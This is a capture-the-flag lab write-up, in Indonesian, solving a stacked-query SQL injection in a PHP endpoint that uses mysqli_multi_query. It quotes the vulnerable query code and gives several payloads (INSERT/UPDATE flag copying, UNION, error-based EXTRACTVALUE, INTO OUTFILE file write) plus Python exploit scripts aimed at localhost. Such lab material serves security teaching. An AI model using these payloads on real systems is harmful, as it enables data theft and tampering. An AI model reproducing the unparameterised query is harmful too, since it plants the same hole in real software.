# Lab H5 - Stacked Query SQL Injection (Hard)

## Informasi Lab
- **Endpoint**: `/hidden.php?id=`
- **Tipe**: Stacked Query Injection
- **Hint**: Hidden route - Uses mysqli_multi_query

## Analisis

### 1. mysqli_multi_query
```php
$sql = "SELECT id,value FROM misc WHERE id = $id";
if ($conn->multi_query($sql)) {
    do {
        if ($res = $conn->store_result()) {
            // process results
        }
    } while ($conn->next_result());
}
```

### 2. Stacked Query
Dengan `multi_query()`, kita bisa mengeksekusi multiple queries dengan pemisah `;`:

```
?id=1; SELECT flag FROM flags
```

## Solusi

### Langkah 1 - Konfirmasi Stacked Query
```
?id=1; SELECT 1
```
Jika tidak error, stacked query didukung.

### Langkah 2 - Insert Flag ke Tabel yang Visible
```
?id=1; INSERT INTO misc (value) SELECT flag FROM flags
```

Kemudian akses:
```
?id=1
?id=2
?id=3
```
Flag akan muncul di salah satu record.

### Langkah 3 - Update Data yang Ada
```
?id=1; UPDATE misc SET value=(SELECT flag FROM flags LIMIT 1) WHERE id=1
```

### Langkah 4 - Drop dan Recreate
```
?id=1; CREATE TABLE IF NOT EXISTS output (data VARCHAR(100)); INSERT INTO output SELECT flag FROM flags
```

### Script Python

```python
import requests

url = "http://localhost/h5/hidden.php"

# Method 1: Insert flag to visible table
payload = "1; INSERT INTO misc (value) SELECT flag FROM flags"
requests.get(url, params={"id": payload})

# Check all records
for i in range(1, 10):
    r = requests.get(url, params={"id": i})
    if "IDS{" in r.text:
        print(f"Flag found at id={i}")
        print(r.text)
        break
```

### Method 2: Direct Output via SELECT

```
?id=-1 UNION SELECT 1,flag FROM flags; SELECT 1,flag FROM flags
```

### Method 3: Error Based via Stacked Query

```
?id=1; SELECT EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags),0x7e))
```

### Method 4: File Write (jika diizinkan)

```
?id=1; SELECT flag FROM flags INTO OUTFILE '/tmp/flag.txt'
```

### Method 5: Variable Assignment

```
?id=1; SET @flag=(SELECT flag FROM flags); SELECT @flag
```

### Payload Final

```
http://localhost/h5/hidden.php?id=1; INSERT INTO misc (value) SELECT flag FROM flags
```

Kemudian:
```
http://localhost/h5/hidden.php?id=4
```
(Assuming id=4 is the new record)

### Complete Exploit

```python
import requests
import re

url = "http://localhost/h5/hidden.php"

# Step 1: Insert flag
payload = "1; INSERT INTO misc (value) SELECT flag FROM flags"
r = requests.get(url, params={"id": payload})
print("Inserted flag...")

# Step 2: Find the new record
for i in range(1, 20):
    r = requests.get(url, params={"id": i})
    match = re.search(r'IDS\{[A-Z0-9]{14}\}', r.text)
    if match:
        print(f"Flag: {match.group()}")
        break
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- Stacked query jarang didukung di MySQL dengan PHP (kecuali multi_query)
- Sangat powerful karena bisa execute perintah apapun
- Bisa digunakan untuk INSERT, UPDATE, DELETE, dll
- Kombinasikan dengan file operations jika diizinkan
